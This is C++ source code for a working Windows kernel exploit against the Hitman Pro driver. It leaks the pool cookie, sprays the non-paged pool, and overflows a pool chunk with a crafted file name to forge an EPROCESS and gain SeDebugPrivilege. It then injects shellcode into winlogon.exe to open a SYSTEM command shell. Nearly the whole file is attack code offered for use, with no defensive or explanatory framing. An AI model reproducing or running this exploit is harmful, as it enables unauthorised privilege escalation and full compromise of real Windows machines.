#include <Windows.h>
#include <stdio.h>
#include <SubAuth.h>
#include <iostream>
#include <time.h>
#include <tchar.h>
#include <psapi.h>
#include "..\..\PoolSprayerLib\PoolSprayerLib\PoolSprayer.h"

#define LEN_PATH_TO_REACH 65
#define FAKE_EPROCESS_SIZE 0x540
#define LEN_TO_OVERFLOW 512

using namespace std;

typedef struct {
	DWORD ProcessId;
	HANDLE File;
} WEIRDSTRUCT, *PWEIRDSTRUCT;


char	executablePaths[4][LEN_PATH_TO_REACH + 1];

char *finalOverflowFile;

void PrintError(void)
{
	printf("Error !!\r\n");
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0)
	{
		printf("No Error Message?"); //No error message has been recorded
		exit(0);
	}
	LPSTR messageBuffer = nullptr;
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

	std::string message(messageBuffer, size);
	printf("Error message: %s\r\n", message.c_str());
}

DWORD getProcessId(TCHAR *name)
{
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		printf("[-]EnumProcess failed...\n");
		exit(0);
	}


	// Calculate how many process identifiers were returned.

	cProcesses = cbNeeded / sizeof(DWORD);
	// Print the name and process identifier for each process.

	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			DWORD processID = aProcesses[i];
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

			// Get a handle to the process.

			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
				PROCESS_VM_READ,
				FALSE, processID);

			// Get the process name.

			if (NULL != hProcess)
			{
				HMODULE hMod;
				DWORD cbNeeded2;

				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
					&cbNeeded2))
				{
					GetModuleBaseName(hProcess, hMod, szProcessName,
						sizeof(szProcessName) / sizeof(TCHAR));
				}
			}

			// Print the process name and identifier.
			if (!lstrcmpW(szProcessName, name))
			{
				CloseHandle(hProcess);
				return (processID);
			}

			// Release the handle to the process.

			CloseHandle(hProcess);
		}
	}

	return 0;

}

void spawnShell()
{
	HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
	PVOID  pLibRemote;
	DWORD processID;
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x00";


	if ((processID = getProcessId(L"winlogon.exe")) == 0)
	{
		printf("Couldn't retrieve process ID...\n");
		exit(0);
	}
	printf("[+]Retrieved process id: %d\n", processID);
	hSystemProcess = OpenProcess(GENERIC_ALL, false, processID);

	if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
	{
		printf("Couldn't open system process...\n");
		PrintError();
		exit(1);
	}
	printf("[+]Got a handle on a system Process: %08p\n", hSystemProcess);


	pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!pLibRemote)
	{
		printf("[-]Virtual alloc failed !\n");
		PrintError();
		exit(0);
	}

	printf("[+]Allocation in system process succeded with address %08p\n", pLibRemote);

	if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
	{
		printf("[-]WriteProcessMemory failed !\n");
		PrintError();
		exit(1);
	}

	HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);

	printf("[+]Writing in system process succeded\n");

	if (hThread == NULL) {
		printf("[-]CreateRemoteThread failed !\n");
		PrintError();
		exit(1);
	}
	else
		printf("[+]Remote thread created !\n");
	CloseHandle(hSystemProcess);
}


BOOL checkPrivilege(HANDLE hTokenHandle)
{
	PRIVILEGE_SET		privSet;
	LUID_AND_ATTRIBUTES Privileges[1];
	BOOL				isPrivilegeSet;

	LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &(Privileges[0].Luid));
	Privileges[0].Attributes = 0;

	privSet.PrivilegeCount = 1;
	privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
	memcpy(privSet.Privilege, Privileges, sizeof(Privileges));

	PrivilegeCheck(hTokenHandle, &privSet, &isPrivilegeSet);
	return (isPrivilegeSet);
}


/*
	Here we craft the fake structure
	Some really precise values are needed at precise address,
	and we don't want any 0x0000 or we wont be able to create a proper BoundaryDescriptor with this.
*/
void initFakeEprocess(PVOID addr, PVOID pTokenObject)
{
	memset((PVOID)addr, 0x41, FAKE_EPROCESS_SIZE);

	addr = (PVOID)((DWORD64)addr + 0x50);
	DWORD64 save = (DWORD64)addr;
	DWORD64 temp = save + 4;
	DWORD64 QuotaValues = 0xAAAAAAAAAAAAAcfc;
	DWORD64 QuotaValues2 = 0xAAAAAAAAAAA255dc;

	memset((char *)addr - 0x40, 0xA, 0x40);
	memset((char *)addr - 0x18, 0xB, 0x1);
	memset(addr, 0x3, 1);

	temp = (DWORD64)((char *)pTokenObject + 0x48);
	memcpy((char *)addr + 0x410, &temp, sizeof(DWORD64));
	for (int i = 0xd8; i < 0xf0; i++)
	{
		memset((char *)addr + i, 2 + (i - 0xd4), 1);
	}

	// precise values are need here, but we can't put any 0x0000 in the structure or it won't be copied
	// in kernel memory
	memcpy((char *)addr + 0xc0, &QuotaValues, 4);
	memcpy((char *)addr + 0xc4, &QuotaValues2, 4);
	memcpy((char *)addr + 0xc8, &QuotaValues, 4);
	memcpy((char *)addr + 0xcc, &QuotaValues2, 4);
}

/*
	Retrieve the address of our process' token
*/
int getMisc(HANDLE * hTokenHandle, PVOID  * pTokenObject)
{
	PSYSTEM_EXTENDED_HANDLE_INFORMATION handleInfo;
	NTSTATUS st;
	HMODULE h;
	ULONG handleInfoLen = 0x10000;
	HANDLE currentProcessHandle;
	DWORD64	currentProcessId;
	NtQuerySystemInformation_t	NtQuerySystemInformation;

	currentProcessId = GetCurrentProcessId();

	h = LoadLibraryA("ntdll.dll");

	if (!h)
	{
		printf("[-]Failed to load module\n");
		return -1;
	}

	NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(h, "NtQuerySystemInformation");

	if (!NtQuerySystemInformation)
	{
		printf("[-]Couldn't get NtQuerySystemInformation address !\n");
		return -1;
	}

	currentProcessHandle = GetCurrentProcess();
	
	OpenProcessToken(currentProcessHandle, GENERIC_READ, hTokenHandle);

	if (*hTokenHandle == INVALID_HANDLE_VALUE)
	{
		printf("Failed to retrieve process token handle \n");
		PrintError();
		return -1;
	}
	handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)malloc(handleInfoLen);
	while ((st = NtQuerySystemInformation(
		SystemExtendedHandleInformation,
		handleInfo,
		handleInfoLen,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)realloc(handleInfo, handleInfoLen *= 2);
	
	if (!NT_SUCCESS(st))
	{
		printf("NtQuerySystemInformation failed with code %X!\n", st);
		free(handleInfo);
		return -1;
	}

	for (UINT i = 0; i < handleInfo->NumberOfHandles; i++)
	{
		if (handleInfo->Handles[i].HandleValue == *hTokenHandle && handleInfo->Handles[i].ObjectTypeIndex == 0x5 && currentProcessId == handleInfo->Handles[i].UniqueProcessId)
		{
			*pTokenObject = handleInfo->Handles[i].Object;
			break;
		}
	}

	if (!*pTokenObject)
	{
		free(handleInfo);
		return -1;
	}

	printf("[+]Got Token Object with address: %016p and handle 0x%p\n", *pTokenObject, *hTokenHandle);
	free(handleInfo);
	return 0;
}


/*
	We craft the fake file.
	The name of this file is the string that will overflow the pool.
*/
HANDLE craftFakeFile(DWORD64 cookie, PVOID OverflowedChunk, PVOID FakeEprocess)
{
	DWORD64		encodedAddress;
	DWORD		FakeHeader = 0x0A0C0024;
	HANDLE		RandomFile = INVALID_HANDLE_VALUE;
	
	size_t len = strlen(finalOverflowFile);
	size_t i = 0;
	size_t j = 0;

	wchar_t name[300];

	memset(name, 0, 300 * sizeof(wchar_t));
	


	for (i = 0; i < len; i++)
	{
		name[i] = (wchar_t)finalOverflowFile[i];
	}

	// We want to overwrite PoolHeader with 0x0A0C0024
	for (i = i; i < len + 2; i = i + 2)
	{
		name[i] = FakeHeader & 0xffff;
		name[i + 1] = FakeHeader >> 16 & 0xffff;
	}
	name[i++] = 0x4141;
	name[i++] = 0x4242;

	//Encode address with cookie and address of overflowed chunk !
	encodedAddress = (DWORD64)(cookie ^ (DWORD64)OverflowedChunk) ^ (DWORD64)FakeEprocess;
	for (j = 0; j < 4; j++)
	{
		name[i + j] = (encodedAddress >> (j * 16)) & 0xffff;
	}
	i += j;
	name[i] = 0x0000;

	RandomFile = CreateFile(name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (RandomFile == INVALID_HANDLE_VALUE)
	{
		PrintError();
		exit(1);
	}
	else
		return RandomFile;
}

/*
	Here three things are done:
	- Retrieve the paths (Concrete and Symbolic) to the Public folder
	- Create the folder tree and copy the executables that will leak the pool cookie
	- Retrieve the full path of the file that will be used to overflow (it will be completed later in CraftFakeFile)
*/
void CreateFolderTree(HANDLE hDevice)
{
	DWORD			CurrentProcessId = GetCurrentProcessId();
	wchar_t		*	sPathToExecutable = (wchar_t *)malloc(0x290);
	char		*	tmpPath;
	const char	*	sPublic = "Public\\";
	const char	*	users = "Users\\";
	const char  *   normalPathToPublic = "C:\\Users\\Public\\";
	char		*	exe = "\\A.exe";
	size_t			len = 0;
	char			finalPath[LEN_PATH_TO_REACH * 2] = "C:\\";
	char		*	pathToPublic;
	size_t			nLenPathToPublic;
	char 			sLeakPoolCookieExecutable[400];
	size_t				nFinalFileSize;

	printf("[+]Creating folder tree...\n");
	RtlZeroMemory(sPathToExecutable, 0x290);
	DeviceIoControl(hDevice, 0x22E1C0, &CurrentProcessId, 0x4, sPathToExecutable, 0x290, NULL, NULL);
	sPathToExecutable = sPathToExecutable + 2;
	len = lstrlen(sPathToExecutable);

	if (len == 0)
	{
		printf("[-]First IOCTL failed... Just rerun exploit !\n");
		exit(1);
	}


	tmpPath = (char *)malloc(len + 1);
	for (size_t i = 0; i < len; i++)
		tmpPath[i] = (char)sPathToExecutable[i];
	tmpPath[len] = 0;

	GetCurrentDirectoryA(200, sLeakPoolCookieExecutable);
	strcat(sLeakPoolCookieExecutable, "\\");
	strcat(sLeakPoolCookieExecutable, "LeakPoolCookie.exe");


	size_t usersIndex = strstr(tmpPath, users) - tmpPath + strlen(users);
	pathToPublic = (char *)malloc(usersIndex + strlen(sPublic) + 1);

	strncpy(pathToPublic, tmpPath, usersIndex);

	pathToPublic[usersIndex] = 0;


	free(tmpPath);
	strcat(pathToPublic, sPublic);


	nLenPathToPublic = strlen(pathToPublic);

	size_t i = 0;

	//Create file which will overflow
	finalOverflowFile = (char *)malloc(LEN_TO_OVERFLOW);

	nFinalFileSize = LEN_TO_OVERFLOW - ((nLenPathToPublic * 2) + (2*2));
	nFinalFileSize /= 2;

	strncpy(finalOverflowFile, normalPathToPublic, strlen(normalPathToPublic));
	finalOverflowFile[strlen(normalPathToPublic)] = 0;


	len = strlen(finalOverflowFile);

	if (len > nFinalFileSize)
	{
		printf("Something is wrong with %s or %s\n", finalOverflowFile, normalPathToPublic);
		exit(1);
	}

	for (i = 0; i < nFinalFileSize; i++)
	{
		finalOverflowFile[len + i] = 'A';
	}
	i = len + i;
	finalOverflowFile[i] = 0;
	CreateDirectoryA(finalOverflowFile, NULL);
	finalOverflowFile[i++] = '\\';
	finalOverflowFile[i++] = 'A';
	finalOverflowFile[i++] = 0;


	tmpPath = (char *)malloc(LEN_PATH_TO_REACH);

	strncpy(tmpPath, pathToPublic, nLenPathToPublic);

	for (i = nLenPathToPublic; i < LEN_PATH_TO_REACH - 6; i++)
	{
		tmpPath[i] = 'A';
	}
	tmpPath[i] = 0;
	strcat(finalPath, tmpPath + usersIndex - strlen(users));
	i = strlen(finalPath);


	for (int j = 0; j < 4; j++)
	{
		strcpy(executablePaths[j], finalPath);
		strcat(executablePaths[j], exe);
		CreateDirectoryA(finalPath, NULL);
		if (!CopyFileA(sLeakPoolCookieExecutable, executablePaths[j], FALSE))
		{
			printf("Failed to copy file...\n");
			PrintError();
			exit(1);
		}
		strncat(finalPath, "A", 1);
		finalPath[++i] = 0;
	}
	free(pathToPublic);
}

/*
	Here we leak the pool cookie by creating other processes since 
	the only way to control our leak is to use the path to the executable
	of the current process
*/
DWORD64 LeakPoolCookie(HANDLE hDevice)
{
	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	DWORD				exitCode;
	DWORD64				cookie = 0;
	DWORD				oldPieceOfCookie = 0;
	DWORD				pieceOfCookie = 0;
	char				*cmdLine;
	char				index[2] = "0";

	CreateFolderTree(hDevice);
	cmdLine = (char *)malloc(LEN_PATH_TO_REACH + 10);
	printf("[+]Leaking Pool Cookie, please wait...\n");
	for (UINT i = 0; i < 4; i++)
	{
		strcpy(cmdLine, executablePaths[i]);
		strcat(cmdLine, " ");
		strcat(cmdLine, index);
		/*
			here, we leak 2 times in a row the same piece of cookie
			to make sure the value we leaked is correct
		*/
		for (INT j = 0; j < 2; j++)
		{
			if (!CreateProcessA(NULL,
				cmdLine,
				NULL,
				NULL,
				FALSE,
				NORMAL_PRIORITY_CLASS ,
				NULL,
				NULL,
				&startupInfo,
				&processInformation))
			{
				printf("[-]Could not create process.. Exiting\n");
			}
			else
			{
				WaitForSingleObject(processInformation.hProcess, INFINITE);
				if (GetExitCodeProcess(processInformation.hProcess, &exitCode))
				{
					if (exitCode == 0)
						j--;
					else
					{
						pieceOfCookie = exitCode;

						if (j == 0)
							oldPieceOfCookie = pieceOfCookie;
						else if (oldPieceOfCookie != pieceOfCookie)
						{
							j = -1;
							printf("[-]PIECE NUMBER %d : Got different pieces of cookies: %02X ---- %02X\n", i + 1, oldPieceOfCookie, pieceOfCookie);
						}
						else
						{
							memcpy((BYTE *)&cookie + i * 2, &pieceOfCookie, 2);
							printf("[+]Got piece number %d: %02X\n", i + 1, pieceOfCookie);
						}
					}
				}
				else
					printf("[-]Couldn't get exit code !\n");
				CloseHandle(processInformation.hProcess);
				CloseHandle(processInformation.hThread);
			}
		}
		index[0]++;
	}

	printf("[+]Got it ! PoolCookie is: 0x%llX\n", cookie);
	return cookie;
}

int main(void)
{
	WEIRDSTRUCT 			finalBuffer;
	HANDLE					hDevice = INVALID_HANDLE_VALUE;
	HANDLE					RandomFile = INVALID_HANDLE_VALUE;
	HANDLE					hTokenHandle = INVALID_HANDLE_VALUE;
	HANDLE					privateNamespace = INVALID_HANDLE_VALUE;
	DWORD					dwIoctlCode = 0x222000;
	DWORD64					cookie;
	UINT					OverflowedChunkHandleIndex;
	PVOID					FakeEprocess = NULL;
	PVOID					OverflowedChunk = NULL;
	DWORD64					pTokenObject = 0;
	wchar_t *				Inbuff;
	wchar_t	*				Outbuff;
	wchar_t	*				Outbuff2;
	NonPagedPoolSprayer	*	pPoolSprayer;
	char					confirm[300];
	HOLE					OverflowHole;


	Inbuff = new wchar_t[FAKE_EPROCESS_SIZE + 0x100];

	printf("[+]Connecting to device...\n");

	hDevice = CreateFile(L"\\\\.\\Hitman Pro 37", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	while (hDevice == INVALID_HANDLE_VALUE)
	{
		hDevice = CreateFile(L"\\\\.\\Hitman Pro 37", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		Sleep(1000);
	}
	printf("[+]Device found ! Handle : %p\n", hDevice);

	printf("[+]Leaking some addresses...\n");
	while (getMisc(&hTokenHandle, (PVOID *)&pTokenObject) < 0)
	{
		;;
	}

	printf("[+]Crafting Fake Eprocess...\n");
	initFakeEprocess(Inbuff, (PVOID)pTokenObject);


	cookie = LeakPoolCookie(hDevice);

	// Allocate enough to dont crash after the exploit
	Outbuff = new wchar_t[0x600];
	Outbuff2 = new wchar_t[0x600];

	finalBuffer.ProcessId = GetCurrentProcessId();

	while (1)
	{
		try
		{
			pPoolSprayer = new NonPagedPoolSprayer();

			privateNamespace = CreatePrivateNamespace(NULL, CreateBoundaryDescriptor(Inbuff, 0), L"nope");
			if (!privateNamespace)
			{
				printf("Could'nt open namespace...\n");
				return 0;
			}
			else
			{
				FakeEprocess = (PVOID)(pPoolSprayer->getObjectAddressWithHandle(privateNamespace, 50));
				FakeEprocess = (PVOID)((DWORD64)FakeEprocess + (0x1A8) + 0x50);
				printf("[+]FakeEprocess object is precisely at address 0x%p\n", FakeEprocess);
			}

			printf("[+]Spraying Pool...\n");
			pPoolSprayer->sprayPool();

			printf("[+]Getting holes ready...\n");
			OverflowHole = pPoolSprayer->planHole(3);

			// We want to close the overflowed chunk as fast as possible so we need its handle
			OverflowedChunkHandleIndex = OverflowHole.nBaseIndexInOriginalSpray - 3;

			// We need the address of the overflowed chunk to properly encode our fake EPROCESS pointer
			OverflowedChunk = (PVOID)((DWORD64)OverflowHole.pBaseAddress + (pPoolSprayer->getSingleObjectSize() * 3)); // base address of hole + single object size * number of holes
			printf("[+]OverflowedChunk is exactly at address %p with handle 0x%p\n", OverflowedChunk, pPoolSprayer->getObjectTable()[OverflowedChunkHandleIndex]);

			//Finally craft final payload
			RandomFile = craftFakeFile(cookie, OverflowedChunk, FakeEprocess);

			finalBuffer.File = RandomFile;

			std::cout << "[+]Start exploit ? Y/N" << std::endl;
			std::cin >> confirm;
			if (confirm[0] != 'y' && confirm[0] != 'Y')
			{
				printf("[-]Exiting...\n");
				exit(1);
			}

			printf("[+]Creating holes...\n");
			pPoolSprayer->createHole(OverflowHole);

			printf("[+]Sending IOCTL...\n");
			DeviceIoControl(hDevice, dwIoctlCode, &finalBuffer, 0x1f0, Outbuff2, 0x1f0, NULL, NULL);

			//Closing the overflowed object so the exploit is triggered ASAP
			if (!CloseHandle(pPoolSprayer->getObjectTable()[OverflowedChunkHandleIndex]))
			{
				printf("[-]Failed to close reserve object handle\n");
				return 0;
			}
			else
				pPoolSprayer->getObjectTable()[OverflowedChunkHandleIndex] = INVALID_HANDLE_VALUE;

			printf("[+]Freeing chunks...\n");
			pPoolSprayer->freePool();


			// Check if we got the SeDebugPrivilege !
			if (checkPrivilege(hTokenHandle))
			{
				printf("[+]Privilege Escalation worked fine ! \n");
				spawnShell();
				CloseHandle(finalBuffer.File);
				break;
			}
			else
				printf("[-]We still dont have enough privilege, retrying...\n\n");
		}
		catch (PoolSprayerException &e)
		{
			printf("[-]Error occured ! %s\n", e.getMessage());
			exit(1);
		}
		CloseHandle(finalBuffer.File);
	}
	delete Inbuff;
	delete Outbuff;
	delete Outbuff2;
	CloseHandle(hDevice);
	return 0;
}